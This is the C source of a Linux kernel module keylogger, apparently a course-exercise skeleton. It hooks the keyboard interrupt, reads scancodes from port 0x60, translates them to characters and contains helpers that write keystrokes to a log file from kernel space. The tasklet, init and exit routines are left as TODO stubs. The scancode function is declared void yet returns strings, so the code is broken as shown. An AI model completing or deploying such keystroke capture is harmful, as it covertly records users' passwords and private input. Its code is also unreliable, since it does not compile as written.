/*
 * A Linux kernel module that registers a keyboard IRQ, translates received scancodes to their corresponding ascii characters,
 * and logs the keystrokes to a file.
 */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/string.h>
#include <linux/version.h>

#define KB_IRQ 1

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
#define VFS_WRITE kernel_write
#else
#define VFS_WRITE vfs_write
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5, 0, 0)
#define uaccess_begin \
            mm_segment_t old_fs = get_fs(); \
            set_fs( get_ds() );
#elif LINUX_VERSION_CODE < KERNEL_VERSION(5,10,0)
#define uaccess_begin \
            mm_segment_t old_fs = get_fs(); \
            set_fs( KERNEL_DS );
#else
#define uaccess_begin \
            mm_segment_t old_fs = force_uaccess_begin();
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,10,0)
#define uaccess_end \
            set_fs(old_fs);
#else
#define uaccess_end \
            force_uaccess_end(old_fs);
#endif

/* =================================================================== */

loff_t log_offset;

/* Opens a file from kernel space. */
struct file* log_open(const char *path, int flags, int rights)
{
	struct file *fp = NULL;
	int error = 0;

	uaccess_begin

	fp = filp_open(path, flags, rights);

	uaccess_end

	if(IS_ERR(fp)){
		/* Debugging... */
		error = PTR_ERR(fp);
		printk("log_open(): ERROR = %d", error);
		return NULL;
	}

	return fp;
}

/* Closes file handle. */
void log_close(struct file *fp)
{
	filp_close(fp, NULL);
}

/* Writes buffer to file from kernel space. */
int log_write(struct file *fp, unsigned char *data,
		unsigned int size)
{
	int ret;

	uaccess_begin

	ret = VFS_WRITE(fp, data, size, &log_offset);
	/* Increase file offset, preparing for next write operation. */
	log_offset += size;

	uaccess_end

	return ret;
}

/* Converts scancode to key. */
void sc_to_ascii(unsigned char scancode, char *buf)
{
	static int shift = 0;

	switch(scancode){
		default: 
            printk(KERN_INFO "Default switch case\n");
			return;

		case 1:
			return "(ESC)";

		case 2:
			return (shift) ? "!" : "1";

		case 3:
			return (shift) ? "@" : "2";

		case 4:
			return (shift) ? "#" : "3";
		
		case 5:
			return (shift) ? "$" : "4";

		case 6:
			return (shift) ? "%" : "5";

		case 7:
			return (shift) ? "^" : "6";

		case 8:
			return (shift) ? "&" : "7";

		case 9:
			return (shift) ? "*" : "8";

		case 10:
			return (shift) ? "(" : "9";

		case 11:
			return (shift) ? ")" : "0";

		case 12:
			return (shift) ? "_" : "-";

		case 13:
			return (shift) ? "+" : "=";

		case 14:
			return "(BACK)";

		case 15:
			return "(TAB)";

		case 16:
			return (shift) ? "Q" : "q";

		case 17:
			return (shift) ? "W" : "w";

		case 18:
			return (shift) ? "E" : "e";

		case 19:
			return (shift) ? "R" : "r";

		case 20:
			return (shift) ? "T" : "t";

		case 21:
			return (shift) ? "Y" : "y";

		case 22:
			return (shift) ? "U" : "u";

		case 23:
			return (shift) ? "I" : "i";

		case 24:
			return (shift) ? "O" : "o";

		case 25:
			return (shift) ? "P" : "p";

		case 26:
			return (shift) ? "{" : "[";

		case 27:
			return (shift) ? "}" : "]";

		case 28:
			return "(ENTER)";

		case 29:
			return "(CTRL)";

		case 30:
			return (shift) ? "A" : "a";

		case 31:
			return (shift) ? "S" : "s";

		case 32:
			return (shift) ? "D" : "d";

		case 33:
			return (shift) ? "F" : "f";
	
		case 34:
			return (shift) ? "G" : "g";

		case 35:
			return (shift) ? "H" : "h";

		case 36:
			return (shift) ? "J" : "j";

		case 37:
			return (shift) ? "K" : "k";

		case 38:
			return (shift) ? "L" : "l";
	
		case 39:
			return (shift) ? ":" : ";";

		case 40:
			return (shift) ? "\"" : "'";

		case 41:
			return (shift) ? "~" : "`";

		case 42:
		case 54:
			shift = 1; break;

		case 170:
		case 182:
			shift = 0; break;

		case 44:
			return (shift) ? "Z" : "z";
		
		case 45:
			return (shift) ? "X" : "x";

		case 46:
			return (shift) ? "C" : "c";

		case 47:
			return (shift) ? "V" : "v";
		
		case 48:
			return (shift) ? "B" : "b";

		case 49:
			return (shift) ? "N" : "n";

		case 50:
			return (shift) ? "M" : "m";

		case 51:
			return (shift) ? "<" : ",";

		case 52:
			return (shift) ? ">" : ".";
	
		case 53:
			return (shift) ? "?" : "/";

		case 56:
			return "(R-ALT)";
	
		/* Space */
		case 55:
		case 57:
		case 58:
		case 59:
		case 60:
		case 61:
		case 62:
		case 63:
		case 64:
		case 65:
		case 66:
		case 67:
		case 68:
		case 70:
		case 71:
		case 72:
			return " ";

		case 83:
			return "(DEL)";
	}
}

/* =================================================================== */

unsigned char scancode;

void tasklet_func(unsigned long data)
{
    /* TODO: write content of the keylogging tasklet. This where we:
     * 1. Translate the scancode received in the IRQ to its string representation.
     * 2. Log the key to the log file.
     */
}

/* TODO: Registers the tasklet for logging keys. */

/* ISR for keyboard IRQ. */
irq_handler_t logger_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
{
	/* Set global value to the received scancode. */
	scancode = inb(0x60);

	/* We want to avoid I/O in an ISR, so schedule a Linux tasklet to
	 * write the key to the log file at the next available time in a 
	 * non-atomic context.
	 */
	/* TODO: schedule the tasklet. */
	
	return (irq_handler_t)IRQ_HANDLED;
}

static int __init logger_init(void)
{
    /* TODO: Implement init function content. This should contain:
     * 1. Open log file.
     * 2. Request keyboard IRQ.
     */
	return 0;
}

static void __exit logger_exit(void)
{
    /* TODO: Free resources that were acquired/initialized by this module. */
}

MODULE_LICENSE("GPL");
module_init(logger_init);
module_exit(logger_exit);
